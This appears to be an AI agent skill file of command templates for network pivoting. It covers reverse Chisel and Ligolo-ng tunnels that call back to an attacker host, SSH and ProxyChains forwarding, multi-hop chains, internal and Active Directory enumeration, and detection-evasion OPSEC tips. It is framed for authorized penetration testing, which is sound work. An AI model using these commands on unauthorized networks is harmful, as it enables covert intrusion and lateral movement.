---
name: pivoting-mastery
description: Advanced network pivoting, tunneling, and lateral movement techniques for multi-hop network penetration.
---

# Pivoting Mastery Skill

## When to Use
Use this skill for network pivoting, tunneling, and lateral movement during authorized penetration testing of complex networks.

## Pivoting Tools

### Chisel
```bash
# Attacker
chisel server --reverse --port 8080

# Target
chisel client <attacker>:8080 R:socks

# Port forward
chisel client <attacker>:8080 R:<local_port>:<target>:<remote_port>
```

### Ligolo-ng
```bash
# Proxy
ligolo-proxy -selfcert

# Agent
ligolo-agent -connect <attacker>:11601 -retry

# In proxy console
>> session
>> ifconfig
>> start
```

### SSH Tunneling
```bash
# Dynamic proxy
ssh -D 1080 user@pivot_host

# Local forward
ssh -L 8080:internal_target:80 user@pivot_host

# Remote forward
ssh -R 8080:localhost:80 user@pivot_host
```

### ProxyChains
```bash
# /etc/proxychains4.conf
strict_chain
proxy_dns
tcp_read_time_out 15000
tcp_connect_time_out 8000
[ProxyList]
socks5 127.0.0.1 1080

# Usage
proxychains nmap -sT -p 80,443 internal_target
proxychains curl http://internal_web
```

## Multi-Hop Pivoting

### Chain Setup
```bash
# Hop 1
chisel client <attacker>:8080 R:socks1

# Hop 2 (through proxychains)
proxychains chisel client <hop1>:8080 R:socks2

# Chain proxychains
# socks5 127.0.0.1 1080
# socks5 127.0.0.1 1081
```

## Network Discovery

```bash
# Internal port scan
proxychains naabu -list internal_hosts.txt -top-ports 100

# Internal service enum
proxychains nmap -sC -sV -p 80,443,445,3389 internal_targets

# AD enumeration
proxychains bloodhound-python -u <user> -p <pass> -d <domain> -dc <dc>
```

## OPSEC for Pivoting
1. Use legitimate protocols (SSH, HTTPS)
2. Limit connection frequency
3. Use encrypted channels
4. Monitor for detection
5. Rotate infrastructure
